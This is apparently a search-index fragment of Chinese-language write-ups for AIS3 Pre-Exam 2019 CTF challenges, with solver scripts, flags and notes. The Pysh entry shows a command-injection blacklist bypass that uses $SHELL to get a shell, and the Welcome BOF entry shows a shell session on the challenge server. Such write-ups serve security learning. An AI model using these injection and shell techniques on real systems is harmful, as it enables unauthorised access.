\u4e5f\u5c31\u662f\u51fa\u73fe\u8ff4\u5708\u3002 Flag AIS3{4R3_Y0U_RUNN1NG_45_F45T_45_CRY5T4L?}","title":"Crystal Maze"},{"location":"CTF/AIS3PreExam2019/Misc/CrystalMaze/#crystal-maze","text":"","title":"Crystal Maze"},{"location":"CTF/AIS3PreExam2019/Misc/CrystalMaze/#question","text":"nc pre-exam-chals.ais3.org 10202","title":"Question"},{"location":"CTF/AIS3PreExam2019/Misc/CrystalMaze/#write-up","text":"\u662f\u500b\u8d70\u8ff7\u5bae\u5c0f\u904a\u6232\uff0c\u9023\u7dda\u4e4b\u5f8c\u6703\u770b\u5230\u4ee5\u4e0b\u8a0a\u606f\uff1a 1 2 3 Bonjour. You're in a 16x16 crystal maze. To take a step, enter \"up\", \"down\", \"left\", or \"right\". move: \u8f38\u5165\u60f3\u8981\u524d\u9032\u7684\u65b9\u5411\uff0c\u5982\u679c\u649e\u5230\u7246\u58c1\u6703\u56de\u50b3 wall \uff0c\u5426\u5247\u662f ok \uff0c\u91cd\u8907\u8f38\u5165\u76f4\u5230\u627e\u5230\u7d42\u9ede\u3002 \u53e6\u5916\u9019\u984c\u6709\u6642\u9593\u9650\u5236\uff0c\u5927\u69822~3\u79d2\u5de6\u53f3\u5c31\u6703\u81ea\u52d5\u65b7\u7dda\u3002 \u4f7f\u7528 pwntools \u5e6b\u5fd9\u8f38\u5165\uff0c\u518d\u7528 DFS \u904d\u6b77\u8ff7\u5bae\uff0c\u6210\u529f\u627e\u5230flag\uff0c\u7a0b\u5f0f\u78bc\u5982\u4e0b\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 # -*- coding: UTF-8 -*- #!/usr/bin/env python from pwn import * host = \"pre-exam-chals.ais3.org\" port = 10202 p = [] direct = [ \"up\" , \"down\" , \"left\" , \"right\" ] def main (): dfs ( 3 , 0 ) # \u5df2\u7d93\u77e5\u9053\u7b2c\u4e00\u6b65\u53ea\u80fd\u5411\u53f3\u8d70 def dfs ( dir = 0 , depth = 0 ): global p if len ( p ) > 0 : p = p [ 0 : depth ] # \u4e0d\u80fd\u5f80\u56de\u8d70 if p [ - 1 ] == \"up\" and direct [ dir ] == \"down\" : return elif p [ - 1 ] == \"down\" and direct [ dir ] == \"up\" : return elif p [ - 1 ] == \"left\" and direct [ dir ] == \"right\" : return elif p [ - 1 ] == \"right\" and direct [ dir ] == \"left\" : return # \u5efa\u7acb\u9023\u7dda sh = remote ( host , port ) # \u8d70\u904e\u5df2\u7d93\u77e5\u9053\u7684\u8def if len ( p ) > 0 : for pa in p : sh . sendlineafter ( \"move: \" , pa ) # \u518d\u8d70\u4e00\u6b65 sh . sendlineafter ( \"move: \" , direct [ dir ]) ret = sh . readline () if ret == \"ok \\n \" : # \u6709\u8def\uff01 p . append ( direct [ dir ]) # \u7d00\u9304\u5230\u8def\u5f91\u4e2d # print(p) for i in range ( 4 ): # \u56db\u500b\u65b9\u5411\u90fd\u8d70\u8d70\u770b dfs ( i , depth + 1 ) elif ret == \"wall \\n \" : # \u649e\u5230\u7246 return else : # \u90fd\u4e0d\u662f -> \u627e\u5230flag\u4e86 print ( \"FLAG\" , ret ) sh . interactive () return sh . close () if __name__ == \"__main__\" : main () Note \u70ba\u6c42\u65b9\u4fbf\uff0c\u4e0a\u65b9\u7a0b\u5f0f\u78bc\u6c92\u6709\u8655\u7406\u8ff4\u5708\u60c5\u6cc1\u3002 \u82e5\u8981\u66f4\u5b8c\u5099\uff0c\u9700\u8981\u70ba\u8d70\u904e\u7684\u5ea7\u6a19\uff08\u63a1\u7528\u4e8c\u7dad\u9663\u5217\u7d00\u9304\u76f8\u5c0d\u5ea7\u6a19\uff09\u5857\u984f\u8272\uff08\u767d\u3001\u7070\u8ddf\u9ed1\uff09\uff0c\u8d70\u5230\u7070\u8272\u9ede\u5373\u8868\u793a\u627e\u5230 back edge \u4e5f\u5c31\u662f\u51fa\u73fe\u8ff4\u5708\u3002","title":"Write-up"},{"location":"CTF/AIS3PreExam2019/Misc/CrystalMaze/#flag","text":"AIS3{4R3_Y0U_RUNN1NG_45_F45T_45_CRY5T4L?}","title":"Flag"},{"location":"CTF/AIS3PreExam2019/Misc/KcufsJ/","text":"KcufsJ Question Javascript ?! Write-up \u7d66\u4e86\u660e\u986f\u662f JSFuck \u7684\u5b57\u4e32\uff0c\u6839\u64da\u984c\u76ee\u63d0\u793a\uff0c\u628a\u5b57\u4e32\u53cd\u8f49\u3002 \u53cd\u8f49\u5f8c\u62ff\u53bb\u700f\u89bd\u5668 alert() \u5373\u53ef\u5f97\u5230flag Flag AIS3{R33v33rs33_JSFUCKKKKKK}","title":"KcufsJ"},{"location":"CTF/AIS3PreExam2019/Misc/KcufsJ/#kcufsj","text":"","title":"KcufsJ"},{"location":"CTF/AIS3PreExam2019/Misc/KcufsJ/#question","text":"Javascript ?!","title":"Question"},{"location":"CTF/AIS3PreExam2019/Misc/KcufsJ/#write-up","text":"\u7d66\u4e86\u660e\u986f\u662f JSFuck \u7684\u5b57\u4e32\uff0c\u6839\u64da\u984c\u76ee\u63d0\u793a\uff0c\u628a\u5b57\u4e32\u53cd\u8f49\u3002 \u53cd\u8f49\u5f8c\u62ff\u53bb\u700f\u89bd\u5668 alert() \u5373\u53ef\u5f97\u5230flag","title":"Write-up"},{"location":"CTF/AIS3PreExam2019/Misc/KcufsJ/#flag","text":"AIS3{R33v33rs33_JSFUCKKKKKK}","title":"Flag"},{"location":"CTF/AIS3PreExam2019/Misc/Pysh/","text":"Pysh Question nc pre-exam-chals.ais3.org 10204 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # main.py #!/usr/bin/python import os import sys black_list = \"bcfghijkmnoqstuvwxz!@#|[]{} \\\" '&*()?01234569\" your_input = raw_input ( \":\" ) for i in range ( len ( black_list )): if black_list [ i ] in your_input : print \"Bad hacker....\" exit () print os . system ( \"bash -c '\" + your_input + \"'\" ) Write-up \u9996\u5148\u5230\u81ea\u5df1\u7684\u6a5f\u5668\u4e0a\u627e\u6709\u54ea\u4e9b\u6307\u4ee4\u53ef\u4ee5\u7528 ls /usr/bin/ | grep -v \"[bcfghijkmnoqstuvwxz01234569]\" 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 [ aplay ar GET HEAD ld ldapadd ldd lp lpr paplay pear perl player player.py pldd POST pr X yelp \u672c\u4f86\u4ee5\u70ba\u53ef\u4ee5\u7528 perl \u53d6\u5f97shell\uff0c\u7e3d\u4e4b\u662f\u5931\u6557\u4e86\u3002 \u5176\u5be6\u6253 $SHELL \u5c31\u53ef\u4ee5\u4e86... \u56e0\u70ba $SHELL \u6703\u5b58shell\u7684\u8def\u5f91\uff0c\u53ef\u80fd\u662f /bin/bash \u4e4b\u985e\u7684\uff0c\u6240\u4ee5 bash -c '$SHELL' \u5c31\u662f bash -c '/bin/bash' \uff0c\u76f4\u63a5\u5f97\u5230shell\u3002 \u4e4b\u5f8c ls \u767c\u73fe\u6709\u500b\u6a94\u6848 flag-a008b609dd552dca425779a8e1882485 cat flag-a008b609dd552dca425779a8e1882485 \u5c31\u80fd\u5f97\u5230flag Flag AIS3{read;$REPLY}","title":"Pysh"},{"location":"CTF/AIS3PreExam2019/Misc/Pysh/#pysh","text":"","title":"Pysh"},{"location":"CTF/AIS3PreExam2019/Misc/Pysh/#question","text":"nc pre-exam-chals.ais3.org 10204 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # main.py #!/usr/bin/python import os import sys black_list = \"bcfghijkmnoqstuvwxz!@#|[]{} \\\" '&*()?01234569\" your_input = raw_input ( \":\" ) for i in range ( len ( black_list )): if black_list [ i ] in your_input : print \"Bad hacker....\" exit () print os . system ( \"bash -c '\" + your_input + \"'\" )","title":"Question"},{"location":"CTF/AIS3PreExam2019/Misc/Pysh/#write-up","text":"\u9996\u5148\u5230\u81ea\u5df1\u7684\u6a5f\u5668\u4e0a\u627e\u6709\u54ea\u4e9b\u6307\u4ee4\u53ef\u4ee5\u7528 ls /usr/bin/ | grep -v \"[bcfghijkmnoqstuvwxz01234569]\" 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 [ aplay ar GET HEAD ld ldapadd ldd lp lpr paplay pear perl player player.py pldd POST pr X yelp \u672c\u4f86\u4ee5\u70ba\u53ef\u4ee5\u7528 perl \u53d6\u5f97shell\uff0c\u7e3d\u4e4b\u662f\u5931\u6557\u4e86\u3002 \u5176\u5be6\u6253 $SHELL \u5c31\u53ef\u4ee5\u4e86... \u56e0\u70ba $SHELL \u6703\u5b58shell\u7684\u8def\u5f91\uff0c\u53ef\u80fd\u662f /bin/bash \u4e4b\u985e\u7684\uff0c\u6240\u4ee5 bash -c '$SHELL' \u5c31\u662f bash -c '/bin/bash' \uff0c\u76f4\u63a5\u5f97\u5230shell\u3002 \u4e4b\u5f8c ls \u767c\u73fe\u6709\u500b\u6a94\u6848 flag-a008b609dd552dca425779a8e1882485 cat flag-a008b609dd552dca425779a8e1882485 \u5c31\u80fd\u5f97\u5230flag","title":"Write-up"},{"location":"CTF/AIS3PreExam2019/Misc/Pysh/#flag","text":"AIS3{read;$REPLY}","title":"Flag"},{"location":"CTF/AIS3PreExam2019/Misc/Welcome/","text":"Welcome Question AIS3{echo -n 'Welcom to AIS3 pre-exam in 2019!' | md5sum} Ps. md5 hash only Write-up \u57f7\u884c echo -n 'Welcom to AIS3 pre-exam in 2019!' | md5sum \u5f97\u5230 988069d2c08c1910f422737ca412afe2 Flag AIS3{988069d2c08c1910f422737ca412afe2}","title":"Welcome"},{"location":"CTF/AIS3PreExam2019/Misc/Welcome/#welcome","text":"","title":"Welcome"},{"location":"CTF/AIS3PreExam2019/Misc/Welcome/#question","text":"AIS3{echo -n 'Welcom to AIS3 pre-exam in 2019!' | md5sum} Ps. md5 hash only","title":"Question"},{"location":"CTF/AIS3PreExam2019/Misc/Welcome/#write-up","text":"\u57f7\u884c echo -n 'Welcom to AIS3 pre-exam in 2019!' | md5sum \u5f97\u5230 988069d2c08c1910f422737ca412afe2","title":"Write-up"},{"location":"CTF/AIS3PreExam2019/Misc/Welcome/#flag","text":"AIS3{988069d2c08c1910f422737ca412afe2}","title":"Flag"},{"location":"CTF/AIS3PreExam2019/Pwn/Welcome BOF/","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 [+] Opening connection to pre-exam-pwn.ais3.org on port 10000: Done [*] Switching to interactive mode $ find / -name \"*flag*\" /home/bof/flag /usr/lib/x86_64-linux-gnu/perl/5.26.1/bits/waitflags.ph /usr/lib/x86_64-linux-gnu/perl/5.26.1/bits/ss_flags.ph /sys/devices/pnp0/00:05/tty/ttyS2/flags /sys/devices/pnp0/00:03/tty/ttyS0/flags /sys/devices/pnp0/00:06/tty/ttyS3/flags /sys/devices/pnp0/00:04/tty/ttyS1/flags /sys/devices/platform/serial8250/tty/ttyS15/flags /sys/devices/platform/serial8250/tty/ttyS6/flags /sys/devices/platform/serial8250/tty/ttyS23/flags /sys/devices/platform/serial8250/tty/ttyS13/flags /sys/devices/platform/serial8250/tty/ttyS31/flags /sys/devices/platform/serial8250/tty/ttyS4/flags /sys/devices/platform/serial8250/tty/ttyS21/flags /sys/devices/platform/serial8250/tty/ttyS11/flags /sys/devices/platform/serial8250/tty/ttyS28/flags /sys/devices/platform/serial8250/tty/ttyS18/flags /sys/devices/platform/serial8250/tty/ttyS9/flags /sys/devices/platform/serial8250/tty/ttyS26/flags /sys/devices/platform/serial8250/tty/ttyS16/flags /sys/devices/platform/serial8250/tty/ttyS7/flags /sys/devices/platform/serial8250/tty/ttyS24/flags /sys/devices/platform/serial8250/tty/ttyS14/flags /sys/devices/platform/serial8250/tty/ttyS5/flags /sys/devices/platform/serial8250/tty/ttyS22/flags /sys/devices/platform/serial8250/tty/ttyS12/flags /sys/devices/platform/serial8250/tty/ttyS30/flags /sys/devices/platform/serial8250/tty/ttyS20/flags /sys/devices/platform/serial8250/tty/ttyS10/flags /sys/devices/platform/serial8250/tty/ttyS29/flags /sys/devices/platform/serial8250/tty/ttyS19/flags /sys/devices/platform/serial8250/tty/ttyS27/flags /sys/devices/platform/serial8250/tty/ttyS17/flags /sys/devices/platform/serial8250/tty/ttyS8/flags /sys/devices/platform/serial8250/tty/ttyS25/flags /sys/devices/virtual/net/eth0/flags /sys/devices/virtual/net/lo/flags /sys/module/scsi_mod/parameters/default_dev_flags /proc/sys/kernel/acpi_video_flags /proc/sys/kernel/sched_domain/cpu0/domain0/flags /proc/sys/kernel/sched_domain/cpu0/domain1/flags /proc/sys/kernel/sched_domain/cpu1/domain0/flags /proc/sys/kernel/sched_domain/cpu1/domain1/flags /proc/sys/kernel/sched_domain/cpu2/domain0/flags /proc/sys/kernel/sched_domain/cpu2/domain1/flags /proc/sys/kernel/sched_domain/cpu3/domain0/flags /proc/sys/kernel/sched_domain/cpu3/domain1/flags /proc/kpageflags $ cat /home/bof/flag AIS3{TOO0O0O0O0OO0O0OOo0o0o0o00_EASY}","title":"Welcome BOF"},{"location":"CTF/AIS3PreExam2019/Reverse/HolyGrenade/","text":"HolyGrenade Question HolyGrenade 1 2 3 4 5 6 7 8 9 // output.txt ba3a7f3bd92a5d418f5e16886db62674 33e4500b205b80e52dd52e796cba8b7d 7d1c09bbf2025facf6bd0fec0ec6a780 9cedd8dee7b5b87838d7a9bed76df8e5 764d30cb4807c5a870a47b53be6cf662 f1e8fda6c3ff87e43905ea1690624c64 d7939cb11edaa9b1fb05efb4e2946f75 5ae001ebd955475c867617bdb72e7728 Write-up \u628a\u984c\u76ee\u63d0\u4f9b\u7684 HolyGrenade.pyc \u62ff\u53bb decompile \uff0c\u5f97\u5230\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 # Python bytecode 3.7 (3394) # Embedded file name: HolyGrenade.py # Size of source mod 2**32: 829 bytes # Decompiled by https://python-decompiler.com from secret import flag from hashlib import md5 def OO0o ( arg ): arg = bytearray ( arg , 'ascii' ) for Oo0Ooo in range ( 0 , len ( arg ), 4 ): O0O0OO0O0O0 = arg [ Oo0Ooo ] iiiii = arg [( Oo0Ooo + 1 )] ooo0OO = arg [( Oo0Ooo + 2 )] II1 = arg [( Oo0Ooo + 3 )] arg [ Oo0Ooo + 2 ] = II1 arg [ Oo0Ooo + 1 ] = O0O0OO0O0O0 arg [ Oo0Ooo + 3 ] = iiiii arg [ Oo0Ooo ] = ooo0OO return arg . decode ( 'ascii' ) flag += '0' * ( len ( flag ) % 4 ) for Oo0Ooo in range ( 0 , len ( flag ), 4 ): print ( OO0o ( md5 ( bytes ( flag [ Oo0Ooo : Oo0Ooo + 4 ])) . hexdigest ())) \u7c21\u55ae\u4f86\u8aaa\u5b83\u6703\u628a flag \u7de8\u78bc\u6210 output.txt \u90a3\u6a23\uff0c\u6bcf\u4e00\u5217\u90fd\u662f\u7531\u56db\u500b\u5b57\u5143\u7d44\u6210\u7684\uff0c\u50cf ouptut.txt \u7684\u7b2c\u4e00\u5217\u4ee3\u8868 AIS3 \u3002 \u6c7a\u5b9a\u76f4\u63a5\u7206\u7834\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 from hashlib import md5 key = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXY0123456789{}_\" output = [ \"ba3a7f3bd92a5d418f5e16886db62674\" , \"33e4500b205b80e52dd52e796cba8b7d\" , \"7d1c09bbf2025facf6bd0fec0ec6a780\" , \"9cedd8dee7b5b87838d7a9bed76df8e5\" , \"764d30cb4807c5a870a47b53be6cf662\" , \"f1e8fda6c3ff87e43905ea1690624c64\" , \"d7939cb11edaa9b1fb05efb4e2946f75\" , \"5ae001ebd955475c867617bdb72e7728\" ] flag = '' def decodeFunction ( arg ): arg = bytearray ( arg , 'ascii' ) for f in range ( 0 , len ( arg ), 4 ): a = arg [ f ] b = arg [( f + 1 )] c = arg [( f + 2 )] d = arg [( f + 3 )] arg [ f + 2 ] = d arg [ f + 1 ] = a arg [ f + 3 ] = b arg [ f ] = c return arg . decode ( 'ascii' ) nextOutput = False for o in output : nextOutput = False for a in key : for b in key : for c in key : for d in key : tmp = a + b + c + d tmp += '0' * ( len ( tmp ) % 4 ) for f in range ( 0 , len ( tmp ), 4 ): tmpOutput = decodeFunction ( md5 ( bytes ( tmp [ f : f + 4 ])) . hexdigest ()) if tmpOutput == o : nextOutput = True flag += tmp if nextOutput : break if nextOutput : break if nextOutput : break if nextOutput : break print ( flag ) \u5403\u500b\u98ef\u56de\u4f86\u5c31\u5f97\u5230flag\u4e86 Flag AIS3{7here_15_the_k1ll3r_ra661t}","title":"HolyGrenade"},{"location":"CTF/AIS3PreExam2019/Reverse/HolyGrenade/#holygrenade","text":"","title":"HolyGrenade"},{"location":"CTF/AIS3PreExam2019/Reverse/HolyGrenade/#question","text":"HolyGrenade 1 2 3 4 5 6 7 8 9 // output.txt ba3a7f3bd92a5d418f5e16886db62674 33e4500b205b80e52dd52e796cba8b7d 7d1c09bbf2025facf6bd0fec0ec6a780 9cedd8dee7b5b87838d7a9bed76df8e5 764d30cb4807c5a870a47b53be6cf662 f1e8fda6c3ff87e43905ea1690624c64 d7939cb11edaa9b1fb05efb4e2946f75 5ae001ebd955475c867617bdb72e7728","title":"Question"},{"location":"CTF/AIS3PreExam2019/Reverse/HolyGrenade/#write-up","text":"\u628a\u984c\u76ee\u63d0\u4f9b\u7684 HolyGrenade.pyc \u62ff\u53bb decompile \uff0c\u5f97\u5230\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 # Python bytecode 3.7 (3394) # Embedded file name: HolyGrenade.py # Size of source mod 2**32: 829 bytes # Decompiled by https://python-decompiler.com from secret import flag from hashlib import md5 def OO0o ( arg ): arg = bytearray ( arg , 'ascii' ) for Oo0Ooo in range ( 0 , len ( arg ), 4 ): O0O0OO0O0O0 = arg [ Oo0Ooo ] iiiii = arg [( Oo0Ooo + 1 )] ooo0OO = arg [( Oo0Ooo + 2 )] II1 = arg [( Oo0Ooo + 3 )] arg [ Oo0Ooo + 2 ] = II1 arg [ Oo0Ooo + 1 ] = O0O0OO0O0O0 arg [ Oo0Ooo + 3 ] = iiiii arg [ Oo0Ooo ] = ooo0OO return arg . decode ( 'ascii' ) flag += '0' * ( len ( flag ) % 4 ) for Oo0Ooo in range ( 0 , len ( flag ), 4 ): print ( OO0o ( md5 ( bytes ( flag [ Oo0Ooo : Oo0Ooo + 4 ])) . hexdigest ())) \u7c21\u55ae\u4f86\u8aaa\u5b83\u6703\u628a flag \u7de8\u78bc\u6210 output.txt \u90a3\u6a23\uff0c\u6bcf\u4e00\u5217\u90fd\u662f\u7531\u56db\u500b\u5b57\u5143\u7d44\u6210\u7684\uff0c\u50cf ouptut.txt \u7684\u7b2c\u4e00\u5217\u4ee3\u8868 AIS3 \u3002 \u6c7a\u5b9a\u76f4\u63a5\u7206\u7834\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 from hashlib import md5 key = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXY0123456789{}_\" output = [ \"ba3a7f3bd92a5d418f5e16886db62674\" , \"33e4500b205b80e52dd52e796cba8b7d\" , \"7d1c09bbf2025facf6bd0fec0ec6a780\" , \"9cedd8dee7b5b87838d7a9bed76df8e5\" , \"764d30cb4807c5a870a47b53be6cf662\" , \"f1e8fda6c3ff87e43905ea1690624c64\" , \"d7939cb11edaa9b1fb05efb4e2946f75\" , \"5ae001ebd955475c867617bdb72e7728\" ] flag = '' def decodeFunction ( arg ): arg = bytearray ( arg , 'ascii' ) for f in range ( 0 , len ( arg ), 4 ): a = arg [ f ] b = arg [( f + 1 )] c = arg [( f + 2 )] d = arg [( f + 3 )] arg [ f + 2 ] = d arg [ f + 1 ] = a arg [ f + 3 ] = b arg [ f ] = c return arg . decode ( 'ascii' ) nextOutput = False for o in output : nextOutput = False for a in key : for b in key : for c in key : for d in key : tmp = a + b + c + d tmp += '0' * ( len ( tmp ) % 4 ) for f in range ( 0 , len ( tmp ), 4 ): tmpOutput = decodeFunction ( md5 ( bytes ( tmp [ f : f + 4 ])) . hexdigest ()) if tmpOutput == o : nextOutput = True flag += tmp if nextOutput : break if nextOutput : break if nextOutput : break if nextOutput : break print ( flag ) \u5403\u500b\u98ef\u56de\u4f86\u5c31\u5f97\u5230flag\u4e86","title":"Write-up"},{"location":"CTF/AIS3PreExam2019/Reverse/HolyGrenade/#flag","text":"AIS3{7here_15_the_k1ll3r_ra661t}","title":"Flag"},{"location":"CTF/AIS3PreExam2019/Reverse/Trivial/","text":"Trivial Question It's trivial, but the speed would affect your ranking Write-up strings Trivial | grep \"AIS3\" \u767c\u73fe\u6709\u6771\u897f\u3002 \u6240\u4ee5\u679c\u65b7 strings Trivial \uff0c\u627e\u5230\u8a31\u591a\u660e\u986f\u662fflag\u7684\u6771\u897f\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 AIS3 IS3{ S3{T 3{Th {Thi This his_ is_i s_is _is_ is_a s_a_ _a_r a_re _rea real eall alll llll llll llll llll llll llll llll llll llly lly_ ly_b y_bo _boa boar oari arii riii iiin iing ing_ ng_c g_ch _cha chal hall alle llen leng enge nge} \u6e4a\u4e00\u6e4a\u5c31\u6709flag\u4e86 Flag AIS3{This_is_a_reallllllllllly_boariiing_challenge}","title":"Trivial"},{"location":"CTF/AIS3PreExam2019/Reverse/Trivial/#trivial","text":"","title":"Trivial"},{"location":"CTF/AIS3PreExam2019/Reverse/Trivial/#question","text":"It's trivial, but the speed would affect your ranking","title":"Question"},{"location":"CTF/AIS3PreExam2019/Reverse/Trivial/#write-up","text":"strings Trivial | grep \"AIS3\" \u767c\u73fe\u6709\u6771\u897f\u3002 \u6240\u4ee5\u679c\u65b7 strings Trivial \uff0c\u627e\u5230\u8a31\u591a\u660e\u986f\u662fflag\u7684\u6771\u897f\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 AIS3 IS3{ S3{T 3{Th {Thi This his_ is_i s_is _is_ is_a s_a_ _a_r a_re _rea real eall alll llll llll llll llll llll llll llll llll llly lly_ ly_b y_bo _boa boar oari arii riii iiin iing ing_ ng_c g_ch _cha chal hall alle llen leng enge nge} \u6e4a\u4e00\u6e4a\u5c31\u6709flag\u4e86","title":"Write-up"},{"location":"CTF/AIS3PreExam2019/Reverse/Trivial/#flag","text":"AIS3{This_is_a_reallllllllllly_boariiing_challenge}","title":"Flag"},{"location":"CTF/AIS3PreExam2019/Reverse/TsaiBro/","text":"TsaiBro Question \u89c0...\u81ea\u5728...\u83e9\u85a9...\u884c...\u6df1...\u822c\u82e5... \u6ce2\u7f85...\u5bc6...\u591a...\u6642...\u7167\u898b...\u4e94\u860a\u7686\u7a7a. 1 2 3 // flag.txt Terry...\u9006\u9006...\u6c92\u6709...\u5b78\u554f...\u55ae\u7d14...\u5206\u4eab...\u500b\u4eba...\u751f\u6d3b...\u611f\u89f8... \u767c\u8ca1....\u767c\u8ca1...\u767c\u8ca1.....\u767c\u8ca1...\u767c\u8ca1......\u767c\u8ca1.....\u767c\u8ca1.......\u767c\u8ca1.......\u767c\u8ca1........\u767c\u8ca1......\u767c\u8ca1....\u767c\u8ca1.\u767c\u8ca1.......\u767c\u8ca1....\u767c\u8ca1...\u767c\u8ca1.....\u767c\u8ca1........\u767c\u8ca1........\u767c\u8ca1.......\u767c\u8ca1........\u767c\u8ca1...\u767c\u8ca1..\u767c\u8ca1.\u767c\u8ca1.....\u767c\u8ca1........\u767c\u8ca1........\u767c\u8ca1.\u767c\u8ca1.\u767c\u8ca1........\u767c\u8ca1........\u767c\u8ca1.\u767c\u8ca1..\u767c\u8ca1.......\u767c\u8ca1.....\u767c\u8ca1.\u767c\u8ca1.......\u767c\u8ca1........\u767c\u8ca1........\u767c\u8ca1.\u767c\u8ca1......\u767c\u8ca1.......\u767c\u8ca1........\u767c\u8ca1..\u767c\u8ca1......\u767c\u8ca1........\u767c\u8ca1........\u767c\u8ca1.......\u767c\u8ca1....\u767c\u8ca1.\u767c\u8ca1......\u767c\u8ca1........\u767c\u8ca1........\u767c\u8ca1...\u767c\u8ca1....\u767c\u8ca1...\u767c\u8ca1...\u767c\u8ca1.\u767c\u8ca1.\u767c\u8ca1..\u767c\u8ca1.\u767c\u8ca1.\u767c\u8ca1..\u767c\u8ca1...\u767c\u8ca1..\u767c\u8ca1..\u767c\u8ca1.......\u767c\u8ca1........\u767c\u8ca1........\u767c\u8ca1..\u767c\u8ca1......\u767c\u8ca1.......\u767c\u8ca1....\u767c\u8ca1...\u767c\u8ca1.......\u767c\u8ca1........\u767c\u8ca1....... Write-up strings TsaiBro \u80fd\u767c\u73fe\u4e00\u7d44\u5b57\u4e32 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXY0123456789{}_ \u5148\u5b58\u4e0b\u4f86 \u57f7\u884c\u5f8c\u767c\u73fe\u8981\u52a0\u53c3\u6578\uff0c\u7a0d\u5fae\u8a66\u4e00\u4e0b\u4e0d\u96e3\u767c\u73fe\u898f\u5f8b\uff1a 1 2 3 4 5 6 7 8 9 10 11 a -> \u767c\u8ca1.\u767c\u8ca1. b -> \u767c\u8ca1.\u767c\u8ca1.. c -> \u767c\u8ca1.\u767c\u8ca1... d -> \u767c\u8ca1.\u767c\u8ca1.... e -> \u767c\u8ca1.\u767c\u8ca1..... f -> \u767c\u8ca1.\u767c\u8ca1...... g -> \u767c\u8ca1.\u767c\u8ca1....... h -> \u767c\u8ca1.\u767c\u8ca1........ i -> \u767c\u8ca1..\u767c\u8ca1. j -> \u767c\u8ca1..\u767c\u8ca1.. ... \u628a flag.txt \u62ff\u4f86\u89e3\u78bc\u5c31\u80fd\u5f97\u5230flag Flag AIS3{y0u_4re_a_b1g_f4n_0f_tsaibro_n0w} \u4e26\u6c92\u6709","title":"TsaiBro"},{"location":"CTF/AIS3PreExam2019/Reverse/TsaiBro/#tsaibro","text":"","title":"TsaiBro"},{"location":"CTF/AIS3PreExam2019/Reverse/TsaiBro/#question","text":"\u89c0...\u81ea\u5728...\u83e9\u85a9...\u884c...\u6df1...\u822c\u82e5... \u6ce2\u7f85...\u5bc6...\u591a...\u6642...\u7167\u898b...\u4e94\u860a\u7686\u7a7a. 1 2 3 // flag.txt Terry...\u9006\u9006...\u6c92\u6709...\u5b78\u554f...\u55ae\u7d14...\u5206\u4eab...\u500b\u4eba...\u751f\u6d3b...\u611f\u89f8... \u767c\u8ca1....\u767c\u8ca1...\u767c\u8ca1.....\u767c\u8ca1...\u767c\u8ca1......\u767c\u8ca1.....\u767c\u8ca1.......\u767c\u8ca1.......\u767c\u8ca1........\u767c\u8ca1......\u767c\u8ca1....\u767c\u8ca1.\u767c\u8ca1.......\u767c\u8ca1....\u767c\u8ca1...\u767c\u8ca1.....\u767c\u8ca1........\u767c\u8ca1........\u767c\u8ca1.......\u767c\u8ca1........\u767c\u8ca1...\u767c\u8ca1..\u767c\u8ca1.\u767c\u8ca1.....\u767c\u8ca1........\u767c\u8ca1........\u767c\u8ca1.\u767c\u8ca1.\u767c\u8ca1........\u767c\u8ca1........\u767c\u8ca1.\u767c\u8ca1..\u767c\u8ca1.......\u767c\u8ca1.....\u767c\u8ca1.\u767c\u8ca1.......\u767c\u8ca1........\u767c\u8ca1........\u767c\u8ca1.\u767c\u8ca1......\u767c\u8ca1.......\u767c\u8ca1........\u767c\u8ca1..\u767c\u8ca1......\u767c\u8ca1........\u767c\u8ca1........\u767c\u8ca1.......\u767c\u8ca1....\u767c\u8ca1.\u767c\u8ca1......\u767c\u8ca1........\u767c\u8ca1........\u767c\u8ca1...\u767c\u8ca1....\u767c\u8ca1...\u767c\u8ca1...\u767c\u8ca1.\u767c\u8ca1.\u767c\u8ca1..\u767c\u8ca1.\u767c\u8ca1.\u767c\u8ca1..\u767c\u8ca1...\u767c\u8ca1..\u767c\u8ca1..\u767c\u8ca1.......\u767c\u8ca1........\u767c\u8ca1........\u767c\u8ca1..\u767c\u8ca1......\u767c\u8ca1.......\u767c\u8ca1....\u767c\u8ca1...\u767c\u8ca1.......\u767c\u8ca1........\u767c\u8ca1.......","title":"Question"},{"location":"CTF/AIS3PreExam2019/Reverse/TsaiBro/#write-up","text":"strings TsaiBro \u80fd\u767c\u73fe\u4e00\u7d44\u5b57\u4e32 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXY0123456789{}_ \u5148\u5b58\u4e0b\u4f86 \u57f7\u884c\u5f8c\u767c\u73fe\u8981\u52a0\u53c3\u6578\uff0c\u7a0d\u5fae\u8a66\u4e00\u4e0b\u4e0d\u96e3\u767c\u73fe\u898f\u5f8b\uff1a 1 2 3 4 5 6 7 8 9 10 11 a -> 